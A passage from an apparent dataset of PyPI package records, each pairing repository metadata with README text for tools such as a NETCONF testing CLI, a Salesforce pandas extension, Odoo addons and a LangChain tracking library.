2023-04-29 17:40:44.033 | DEBUG    | netconf_tool.yangcli.get_config:netconf_tool_cli_yangcli_get_config:38 - Filter that will be used for get-config: <network-instances xmlns=""http://openconfig.net/yang/network-instance""><network-instance><protocols><protocol><isis><global><lsp-bit><overload-bit><config /></overload-bit></lsp-bit></global></isis></protocol></protocols></network-instance></network-instances>
2023-04-29 17:40:44.034 | INFO     | netconf_tool.yangcli.get_config:netconf_tool_cli_yangcli_get_config:39 - Attempting to establish NETCONF session to 192.0.2.1:830
2023-04-29 17:40:47.916 | SUCCESS  | netconf_tool.yangcli.get_config:netconf_tool_cli_yangcli_get_config:50 - Established NETCONF connection to 192.0.2.1:830 (Session ID: 22532404)
<?xml version=""1.0"" ?><data xmlns=""urn:ietf:params:xml:ns:netconf:base:1.0"" xmlns:nc=""urn:ietf:params:xml:ns:netconf:base:1.0""> 
   <network-instances xmlns=""http://openconfig.net/yang/network-instance"">  
     <network-instance>   
       <name>default</name>   
       <protocols>    
         <protocol>     
           <identifier xmlns:idx=""http://openconfig.net/yang/policy-types"">idx:ISIS</identifier>     
           <name>1</name>     
           <isis>      
             <global>       
               <lsp-bit>        
                 <overload-bit>         
                   <config>          
                     <set-bit-on-boot>true</set-bit-on-boot>          
                   </config>         
                 </overload-bit>        
               </lsp-bit>       
             </global>      
           </isis>     
         </protocol>    
       </protocols>   
     </network-instance>  
   </network-instances> 
 </data>
```
","# netconf-tool

This is a tool aimed for developer experience / making things faster when I am trying to test NETCONF related tasks without having to rewrite a random python script. I've found myself constantly writing little python scripts for NETCONF to test functionality or even grab data such as server capabilities, setup event based notifications/subscription to test something and have probably got 100 scripts that do the same thing in different folders through the various projects I've worked on.

Therefore I've created this tool to improve my developer experience working with NETCONF. At the ease of a quick command, I want to be able to get config, try out some edit-config functionality, grab capabilities of a new vendor I am working with, test NETCONF notifications etc... and now I can and want to share my progress as I work my way through adding functionality to this tool.

Here are the reasons for the required modules:

- ncclient                  - Obvious one... Handles the low networking level of SSH/NETCONF
- click and click-plugins   - Click is an awesome tool to build CLI applications, netconf-tool is a CLI application
- loguru                    - Best logging module out there, I don't like exit() and print() statements...
- redis                     - Used to test notification events against a redis pubsub environment
- pika                      - Used to test notification events against a rabbitmq environment
- xmltodict                 - Allow lazy conversion from XML to JSON for formatting arguments on some commands

This CLI application is built to load plugins using the entrypoint of netconf-tools so I may look into adding more functionality once I move over all my developer focused NETCONF tasks to this CLI project.

The plan in the future is to setup a better experience for contributers with pytest and a better pipeline however I will try my best not to break everything when I release a new version...

## Environment Variables

Use NETCONF_TOOL_USERNAME and NETCONF_TOOL_PASSWORD environment variables to prevent exposing the --username and --password arguments in your operating system CLI history.

## Feature Examples

### netconf-tool subscription local

This creates a notification event subscription (RFC 5277) and displays the NETCONF payload on the screen, currently doesn't support replay functionality but is useful when developing NETCONF based alerting NMS/applications.

```bash
$ netconf-tool subscription local --host 192.0.2.1
2023-04-28 22:12:14.299 | INFO     | netconf_tool.subscription.local:cli_subscription_local:18 - Attempting to establish NETCONF session to 192.0.2.1:830
2023-04-28 22:12:14.662 | SUCCESS  | netconf_tool.subscription.local:cli_subscription_local:28 - Established NETCONF connection to 192.0.2.1:830 (Session ID: 43)
2023-04-28 22:12:14.770 | SUCCESS  | netconf_tool.subscription.local:cli_subscription_local:32 - Created Netconf Subscription, you can exit out of here using Ctrl+C
2023-04-28 22:12:14.770 | INFO     | netconf_tool.subscription.local:cli_subscription_local:38 - Awaiting next NETCONF 
2023-04-28 22:12:23.035 | INFO     | netconf_tool.subscription.local:cli_subscription_local:41 - 

2023-04-28T22:12:22Z


netconftool
0

running

/oc-if:interfaces/oc-if:interface[name='xe16']/oc-if:config
merge


/oc-netinst:network-instances/oc-netinst:network-instance/oc-netinst:interfaces/oc-netinst:interface
merge



```

### netconf-tool subscription redis-pubsub

Similar to `netconf-tool subscription local` however sends the NETCONF notification/event to a Redis pubsub channel.

```bash
$ netconf-tool subscription redis-pubsub --host 192.0.2.1
2023-04-29 17:32:55.350 | INFO     | netconf_tool.subscription.redis:cli_subscription_redis_pubsub:35 - Checking if Redis server 127.0.0.1:6379 is available
2023-04-29 17:32:55.374 | SUCCESS  | netconf_tool.subscription.redis:cli_subscription_redis_pubsub:39 - Redis server is available...
2023-04-29 17:32:55.374 | INFO     | netconf_tool.subscription.redis:cli_subscription_redis_pubsub:44 - Attempting to establish NETCONF session to 192.0.2.1:830
2023-04-29 17:32:55.725 | SUCCESS  | netconf_tool.subscription.redis:cli_subscription_redis_pubsub:55 - Established NETCONF connection to 192.0.2.1:830 (Session ID: 117)
2023-04-29 17:32:55.832 | SUCCESS  | netconf_tool.subscription.redis:cli_subscription_redis_pubsub:59 - Created Netconf Subscription, you can exit out of here using Ctrl+C
2023-04-29 17:32:55.833 | INFO     | netconf_tool.subscription.redis:cli_subscription_redis_pubsub:65 - Awaiting next NETCONF 
```

Example using redis-cli
```
$ redis-cli
127.0.0.1:6379> subscribe netconf_tool:all_events
Reading messages... (press Ctrl-C to quit)
1) ""subscribe""
2) ""netconf_tool:all_events""
3) (integer) 1
1) ""message""
2) ""netconf_tool:all_events""
3) ""\n\n  2023-04-29T15:24:39Z\n  \n    \n      netconftool\n      0\n    \n    running\n    \n      /oc-if:interfaces/oc-if:interface[name='xe7']/oc-if:config\n      merge\n    \n    \n      /oc-netinst:network-instances/oc-netinst:network-instance/oc-netinst:interfaces/oc-netinst:interface\n      merge\n    \n  \n""
1) ""message""
2) ""netconf_tool:all_events""
3) ""\n\n  2023-04-29T15:24:39Z\n  critical\n  state\n  \n    xe7\n    down\n  \n""
```

### netconf-tool subscription rabbitmq

Similar to `netconf-tool subscription local` however sends the NETCONF notification/event to a RabbitMQ Queue.

```bash
$ netconf-tool subscription rabbitmq --host 192.0.2.1
2023-04-29 17:35:35.465 | INFO     | netconf_tool.subscription.rabbitmq:cli_subscription_rabbitmq:78 - Checking if RabbitMQ Server 127.0.0.1:5672 is available
2023-04-29 17:35:35.465 | INFO     | netconf_tool.subscription.rabbitmq:cli_subscription_rabbitmq:82 - Attempting to establish NETCONF session to 192.0.2.1:830
2023-04-29 17:35:35.831 | SUCCESS  | netconf_tool.subscription.rabbitmq:cli_subscription_rabbitmq:92 - Established NETCONF connection to 192.0.2.1:830 (Session ID: 118)
2023-04-29 17:35:35.938 | SUCCESS  | netconf_tool.subscription.rabbitmq:cli_subscription_rabbitmq:96 - Created Netconf Subscription, you can exit out of here using Ctrl+C
2023-04-29 17:35:35.938 | INFO     | netconf_tool.subscription.rabbitmq:cli_subscription_rabbitmq:102 - Awaiting next NETCONF 
```

### netconf-tool operations get-config

Simply prints out the returned data using the `get-config` NETCONF operation.

```bash
$ netconf-tool operations get-config --host 192.0.2.1
2023-04-29 17:28:48.547 | INFO     | netconf_tool.operations.get_config:cli_operations_get_config:43 - Attempting to establish NETCONF session to 192.0.2.1:830
2023-04-29 17:28:48.915 | SUCCESS  | netconf_tool.operations.get_config:cli_operations_get_config:53 - Established NETCONF connection to 192.0.2.1:830 (Session ID: 115)


```

### netconf-tool operations list-server-capabilities

Prints the server capabilities unless --export-json flag is used, if this flag is used then each capability will be parsed into an RFC3986 compliant object/dictionary and then exported into the relevant filename used in this argument.

```bash
$ netconf-tool operations list-server-capabilities --host 192.0.2.1
2023-04-29 17:27:59.209 | INFO     | netconf_tool.operations.capabilities:netconf_tool_cli_operations_list_server_capabilities:29 - Attempting to establish NETCONF session to 192.0.2.1:830
2023-04-29 17:27:59.566 | SUCCESS  | netconf_tool.operations.capabilities:netconf_tool_cli_operations_list_server_capabilities:39 - Established NETCONF connection to 192.0.2.1:830 (Session ID: 113)
urn:ietf:params:netconf:base:1.0
urn:ietf:params:netconf:base:1.1
urn:ietf:params:netconf:capability:candidate:1.0
urn:ietf:params:netconf:capability:confirmed-commit:1.0
urn:ietf:params:netconf:capability:confirmed-commit:1.1
urn:ietf:params:netconf:capability:rollback-on-error:1.0
urn:ietf:params:netconf:capability:startup:1.0
urn:ietf:params:netconf:capability:url:1.0?scheme=file,ftp,http
urn:ietf:params:netconf:capability:notification:1.0
urn:ietf:params:netconf:capability:interleave:1.0
urn:ietf:params:netconf:capability:with-defaults:1.0?basic-mode=explicit&also-supported=trim,report-all,report-all-tagged
```

### netconf-tool yangcli get-config

This command will attempt to lazily build the dynamic XML filter for a provided command in the traditional CLI style, it was inspired by yangcli however doesn't involve YANG at all for any validation, its simply a hack to build the filter if you have an idea of the XML format without having to wrap the text in XML tags. For example if you are trying to just pull the overload-bit configuration from ISIS using Openconfig, then format your CLI command like this:

`network-instances@http://openconfig.net/yang/network-instance network-instance protocols protocol isis global lsp-bit overload-bit config`

Use `@` to include XML Namespaces in your command structure. This simply sets the XML name of the element to` xmlns` and uses the value after the @.

```
netconf-tool yangcli get-config --host 192.0.2.1 ""network-instances@http://openconfig.net/yang/network-instance network-instance protocols protocol isis global lsp-bit overload-bit config""
2023-04-29 17:40:44.033 | DEBUG    | netconf_tool.yangcli.get_config:netconf_tool_cli_yangcli_get_config:38 - Filter that will be used for get-config: 
2023-04-29 17:40:44.034 | INFO     | netconf_tool.yangcli.get_config:netconf_tool_cli_yangcli_get_config:39 - Attempting to establish NETCONF session to 192.0.2.1:830
2023-04-29 17:40:47.916 | SUCCESS  | netconf_tool.yangcli.get_config:netconf_tool_cli_yangcli_get_config:50 - Established NETCONF connection to 192.0.2.1:830 (Session ID: 22532404)



default


idx:ISIS
1





true










```
",bspendlove/netconf-tool
simpler-sf,https://github.com/benvigano/simpler-sf,0,1555,1555,"# simpler-sf
Extending the low-level Salesforce API client [Simple Salesforce](https://github.com/simple-salesforce/simple-salesforce) to support exports in Pandas, and other features.

## Usage
### Install
`pip install simpler-sf`

### Importing
```python
import simpler-sf
simpler-sf.simple_salesforce()
import simple_salesforce
# That's it!
```
### `smart_query()`
Simpler-sf adds the `smart_query()` method to the `simple_salesforce.Salesforce` class.

The advantages over the existing methods are:
- Query results in `pd.Dataframe` format
- Un-nesting of results for relationship queries (aka the infamous `'attributes'` dictionary) 
- No limit on the number of output rows as in `simple_salesforce.Salesforce.query()` **and** at the same time...
- No need to use a different class for each Salesforce object as in `sf.bulk.Account.query(query)`
- The option to filter dynamically, on large amounts of values without a limit on the number of characters (see example below)

##### Example
```python 
sf = simple_salesforce.Salesforce(username=username, password=password, security_token=token)
df = sf.smart_query('SELECT Contact.Name, Account.Name Id FROM Call')
```

##### Example with filtering
```python 
sf = simple_salesforce.Salesforce(username=username, password=password, security_token=token)

ids = ['0032400000QZbmtAAD', '0032400000eGqdZAAS', '00324036u9QZbnGAAT', '50130000000014C']
query = \
'''
SELECT
Id,
FirstName,
LastName,
Pronouns,
Phone,
Email
FROM Contact
'''
df = sf.smart_query(query, filter_field='Id', filter_values=ids)
```
","# simpler-sf
Extending the low-level Salesforce API client [Simple Salesforce](https://github.com/simple-salesforce/simple-salesforce) to support exports in Pandas, and other features.

## Usage
### Install
`pip install simpler-sf`

### Importing
```python
import simpler-sf
simpler-sf.simple_salesforce()
import simple_salesforce
# That's it!
```
### `smart_query()`
Simpler-sf adds the `smart_query()` method to the `simple_salesforce.Salesforce` class.

The advantages over the existing methods are:
- Query results in `pd.Dataframe` format
- Un-nesting of results for relationship queries (aka the infamous `'attributes'` dictionary) 
- No limit on the number of output rows as in `simple_salesforce.Salesforce.query()` **and** at the same time...
- No need to use a different class for each Salesforce object as in `sf.bulk.Account.query(query)`
- The option to filter dynamically, on large amounts of values without a limit on the number of characters (see example below)

##### Example
```python 
sf = simple_salesforce.Salesforce(username=username, password=password, security_token=token)
df = sf.smart_query('SELECT Contact.Name, Account.Name Id FROM Call')
```

##### Example with filtering
```python 
sf = simple_salesforce.Salesforce(username=username, password=password, security_token=token)

ids = ['0032400000QZbmtAAD', '0032400000eGqdZAAS', '00324036u9QZbnGAAT', '50130000000014C']
query = \
'''
SELECT
Id,
FirstName,
LastName,
Pronouns,
Phone,
Email
FROM Contact
'''
df = sf.smart_query(query, filter_field='Id', filter_values=ids)
```
",benvigano/simpler-sf
odoo-addon-sale-coupon-multiplier-free-product,https://github.com/OCA/sale-promotion,2,3345,2920,"===================================
Sale Coupon Multiplier Free Product
===================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fsale--promotion-lightgray.png?logo=github
    :target: https://github.com/OCA/sale-promotion/tree/15.0/sale_coupon_multiplier_free_product
    :alt: OCA/sale-promotion
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/sale-promotion-15-0/sale-promotion-15-0-sale_coupon_multiplier_free_product
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/296/15.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module extends from *coupon_multiplier_free_product* and allows to make
promotions of the type 3x2 or take this product and get
this one another that apply as many times as the promotion rules fulfill.

**Table of contents**

.. contents::
   :local:

Usage
=====

Follow the configurations from the base module and be sure to guarantee the
promotions defined conditions.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/sale-promotion/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/sale-promotion/issues/new?body=module:%20sale_coupon_multiplier_free_product%0Aversion:%2015.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Tecnativa

Contributors
~~~~~~~~~~~~

* `Tecnativa <https://www.tecnativa.com>`_:

  * David Vidal
  * Stefan Ungureanu

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-chienandalu| image:: https://github.com/chienandalu.png?size=40px
    :target: https://github.com/chienandalu
    :alt: chienandalu

Current `maintainer <https://odoo-community.org/page/maintainer-role>`__:

|maintainer-chienandalu| 

This module is part of the `OCA/sale-promotion <https://github.com/OCA/sale-promotion/tree/15.0/sale_coupon_multiplier_free_product>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","===================================
Sale Coupon Multiplier Free Product
===================================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fsale--promotion-lightgray.png?logo=github
    :target: https://github.com/OCA/sale-promotion/tree/15.0/sale_coupon_multiplier_free_product
    :alt: OCA/sale-promotion
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/sale-promotion-15-0/sale-promotion-15-0-sale_coupon_multiplier_free_product
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/296/15.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module extends from *coupon_multiplier_free_product* and allows to make
promotions of the type 3x2 or take this product and get
this one another that apply as many times as the promotion rules fulfill.

**Table of contents**

.. contents::
   :local:

Usage
=====

Follow the configurations from the base module and be sure to guarantee the
promotions defined conditions.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Tecnativa

Contributors
~~~~~~~~~~~~

* `Tecnativa `_:

  * David Vidal
  * Stefan Ungureanu

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

.. |maintainer-chienandalu| image:: https://github.com/chienandalu.png?size=40px
    :target: https://github.com/chienandalu
    :alt: chienandalu

Current `maintainer `__:

|maintainer-chienandalu| 

This module is part of the `OCA/sale-promotion `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/sale-promotion
passlass408,https://github.com/TheCodingFreakj/password-manager,0,50,50,"A simple python wrapper for creating passwords

","A simple python wrapper for creating passwords

",thecodingfreakj/password-manager
odoo-addon-product-category-company,https://github.com/OCA/multi-company,1,2752,2380,"========================
Product Category Company
========================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fmulti--company-lightgray.png?logo=github
    :target: https://github.com/OCA/multi-company/tree/16.0/product_category_company
    :alt: OCA/multi-company
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/multi-company-16-0/multi-company-16-0-product_category_company
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/133/16.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module allows to set product categories as company dependent.

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/multi-company/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/multi-company/issues/new?body=module:%20product_category_company%0Aversion:%2016.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Akretion

Contributors
~~~~~~~~~~~~

* Kévin Roche <kevin.roche@akretion.com>
* Carmen Bianca Bakker <carmen@coopiteasy.be>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/multi-company <https://github.com/OCA/multi-company/tree/16.0/product_category_company>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","========================
Product Category Company
========================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fmulti--company-lightgray.png?logo=github
    :target: https://github.com/OCA/multi-company/tree/16.0/product_category_company
    :alt: OCA/multi-company
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/multi-company-16-0/multi-company-16-0-product_category_company
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/133/16.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module allows to set product categories as company dependent.

**Table of contents**

.. contents::
   :local:

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Akretion

Contributors
~~~~~~~~~~~~

* Kévin Roche 
* Carmen Bianca Bakker 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/multi-company `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/multi-company
promptwatch,https://github.com/blip-solutions/promptwatch-client,2,3769,3755,"# PromptWatch.io ... session tracking for LangChain 

It enables you to:
- track all the chain executions
- track LLM Prompts and **re-play the LLM runs** with the same input parameters and model settings to tweak your prompt template
- track your costs per **project** and per **tenant** (your customer)

## Installation 
```bash
pip install promptwatch
```

## Basic usage

In order to enable session tracking  wrap you chain executions in PromptWatch block

```python

from langchain import OpenAI, LLMChain, PromptTemplate
from promptwatch import PromptWatch

prompt_template = PromptTemplate.from_template(""Finish this sentence {input}"")
my_chain = LLMChain(llm=OpenAI(), prompt=prompt_template)

with PromptWatch(api_key=""<your-api-key>"") as pw:
    my_chain(""The quick brown fox jumped over"")

```

Here you can get your API key: http://www.promptwatch.io/get-api-key (no registration needed)

You can set it directly into `PromptWatch` constructor, or set is as an *ENV variable* `PROMPTWATCH_API_KEY`

### Project and Tenant costs tracking

You can assign a **project** and **tenant** id to your session by setting the constructor parameter:

This will allow you to track costs per OpenAI request per customer and as well as your dev project.

```python

...

with PromptWatch(tracking_project=""my-project"", tracking_tenant=""my-tenant"",) as pw:
    my_chain(""The quick brown fox jumped over"")

```
### What is being tracked

PromptWatch tracks all the details that LangChain exposes via its tracking ""API"" and more.

👉 Chain execution inputs, outputs, execution time

👉 Tools input output

👉 **retrieved documents from retrieval vector DB**

👉 Details about LLM runs like:

  - final prompt text
  - generated text
  - execution details like model, temperature, etc. (everything you need to re-run the prompt with the same exact setup)
  - total used tokens
  - **costs (based on OpenAI price list per model)**
  - **prompt template and it's parameters**
  
 

### Custom logging

PromptWatch tracks quite extensively standard LangChain tools, but if you have some custom code you'd like to track you can do so.

```python
...
with PromptWatch(api_key=invalid_api_key):
    PromptWatch.log_activity(Question(text=""What did the president say about Ketanji Brown Jackson""))
    PromptWatch.log(""my arbitrary log message"")
```

All the logs are associated with to opened session. You can't log outside the session.

```python
...
with PromptWatch(api_key=invalid_api_key):
    PromptWatch.log_activity(Question(text=""What did the president say about Ketanji Brown Jackson""))
    #end of session   
PromptWatch.log(""this will raise an exception!"")
```


## Prompt template tracking

You can register any LangChain prompt template for detailed monitoring

```python
from promptwatch import PromptWatch
from langchain import OpenAI, LLMChain, PromptTemplate

prompt_template = PromptTemplate.from_template(""Finish this sentence {input}"")
my_chain = LLMChain(llm=OpenAI(), prompt=prompt_template)

with PromptWatch() as pw:
    # register the template for detailed tracking
    pw.register_prompt_template(""your_template_name"",prompt_template) 
    
    #execute the chain
    my_chain(""The quick brown fox jumped over"")

```

This will allow you to associate the prompt template with a custom name (and function) and track it independently... 

Any change of that template text will cause an automatic version change (with automatic version number increment)

**Warning**
The registration just assigns the template a custom name and is only done when the LLM actually executes the LLM prompt with that template. Therefore is has no additional performance costs, on the contrary it can even speed up the execution a bit if the same template is used multiple times.


","# PromptWatch.io ... session tracking for LangChain 

It enables you to:
- track all the chain executions
- track LLM Prompts and **re-play the LLM runs** with the same input parameters and model settings to tweak your prompt template
- track your costs per **project** and per **tenant** (your customer)

## Installation 
```bash
pip install promptwatch
```

## Basic usage

In order to enable session tracking  wrap you chain executions in PromptWatch block

```python

from langchain import OpenAI, LLMChain, PromptTemplate
from promptwatch import PromptWatch

prompt_template = PromptTemplate.from_template(""Finish this sentence {input}"")
my_chain = LLMChain(llm=OpenAI(), prompt=prompt_template)

with PromptWatch(api_key="""") as pw:
    my_chain(""The quick brown fox jumped over"")

```

Here you can get your API key: http://www.promptwatch.io/get-api-key (no registration needed)

You can set it directly into `PromptWatch` constructor, or set is as an *ENV variable* `PROMPTWATCH_API_KEY`

### Project and Tenant costs tracking

You can assign a **project** and **tenant** id to your session by setting the constructor parameter:

This will allow you to track costs per OpenAI request per customer and as well as your dev project.

```python

...

with PromptWatch(tracking_project=""my-project"", tracking_tenant=""my-tenant"",) as pw:
    my_chain(""The quick brown fox jumped over"")

```
### What is being tracked

PromptWatch tracks all the details that LangChain exposes via its tracking ""API"" and more.

👉 Chain execution inputs, outputs, execution time

👉 Tools input output

👉 **retrieved documents from retrieval vector DB**

👉 Details about LLM runs like:

  - final prompt text
  - generated text
  - execution details like model, temperature, etc. (everything you need to re-run the prompt with the same exact setup)
  - total used tokens
  - **costs (based on OpenAI price list per model)**
  - **prompt template and it's parameters**
  
 

### Custom logging

PromptWatch tracks quite extensively standard LangChain tools, but if you have some custom code you'd like to track you can do so.

```python
...
with PromptWatch(api_key=invalid_api_key):
    PromptWatch.log_activity(Question(text=""What did the president say about Ketanji Brown Jackson""))
    PromptWatch.log(""my arbitrary log message"")
```

All the logs are associated with to opened session. You can't log outside the session.

```python
...
with PromptWatch(api_key=invalid_api_key):
    PromptWatch.log_activity(Question(text=""What did the president say about Ketanji Brown Jackson""))
    #end of session   
PromptWatch.log(""this will raise an exception!"")
```


## Prompt template tracking

You can register any LangChain prompt template for detailed monitoring

```python
from promptwatch import PromptWatch
from langchain import OpenAI, LLMChain, PromptTemplate

prompt_template = PromptTemplate.from_template(""Finish this sentence {input}"")
my_chain = LLMChain(llm=OpenAI(), prompt=prompt_template)

with PromptWatch() as pw:
    # register the template for detailed tracking
    pw.register_prompt_template(""your_template_name"",prompt_template) 
    
    #execute the chain
    my_chain(""The quick brown fox jumped over"")

```

This will allow you to associate the prompt template with a custom name (and function) and track it independently... 

Any change of that template text will cause an automatic version change (with automatic version number increment)

**Warning**
The registration just assigns the template a custom name and is only done when the LLM actually executes the LLM prompt with that template. Therefore is has no additional performance costs, on the contrary it can even speed up the execution a bit if the same template is used multiple times.


",blip-solutions/promptwatch-client
wikiseriesbrentlib,https://github.com/narvyk/wikiseriesbrentlib,0,2511,2511,"==================
wikiseriesbrentlib
==================

A library interfacing with wikipedia to retrieve tv series information


* Documentation: https://wikiseriesbrentlib.readthedocs.org/en/latest


Development Workflow
====================

The workflow supports the following steps

 * lint
 * test
 * build
 * document
 * upload
 * graph

These actions are supported out of the box by the corresponding scripts under _CI/scripts directory with sane defaults based on best practices.
Sourcing setup_aliases.ps1 for windows powershell or setup_aliases.sh in bash on Mac or Linux will provide with handy aliases for the shell of all those commands prepended with an underscore.

The bootstrap script creates a .venv directory inside the project directory hosting the virtual environment. It uses pipenv for that.
It is called by all other scripts before they do anything. So one could simple start by calling _lint and that would set up everything before it tried to actually lint the project

Once the code is ready to be delivered the _tag script should be called accepting one of three arguments, patch, minor, major following the semantic versioning scheme.
So for the initial delivery one would call

    $ _tag --minor

which would bump the version of the project to 0.1.0 tag it in git and do a push and also ask for the change and automagically update HISTORY.rst with the version and the change provided.


So the full workflow after git is initialized is:

 * repeat as necessary (of course it could be test - code - lint :) )

   * code
   * lint
   * test
 * commit and push
 * develop more through the code-lint-test cycle
 * tag (with the appropriate argument)
 * build
 * upload (if you want to host your package in pypi)
 * document (of course this could be run at any point)


Important Information
=====================

This template is based on pipenv. In order to be compatible with requirements.txt so the actual created package can be used by any part of the existing python ecosystem some hacks were needed.
So when building a package out of this **do not** simple call

    $ python setup.py sdist bdist_egg

**as this will produce an unusable artifact with files missing.**
Instead use the provided build and upload scripts that create all the necessary files in the artifact.



Project Features
================

* TODO




History
-------

0.0.1 (26-04-2023)
---------------------

* First code creation


0.1.0 (26-04-2023)
------------------

* my first ever pypi package :) 
","==================
wikiseriesbrentlib
==================

A library interfacing with wikipedia to retrieve tv series information


* Documentation: https://wikiseriesbrentlib.readthedocs.org/en/latest


Development Workflow
====================

The workflow supports the following steps

 * lint
 * test
 * build
 * document
 * upload
 * graph

These actions are supported out of the box by the corresponding scripts under _CI/scripts directory with sane defaults based on best practices.
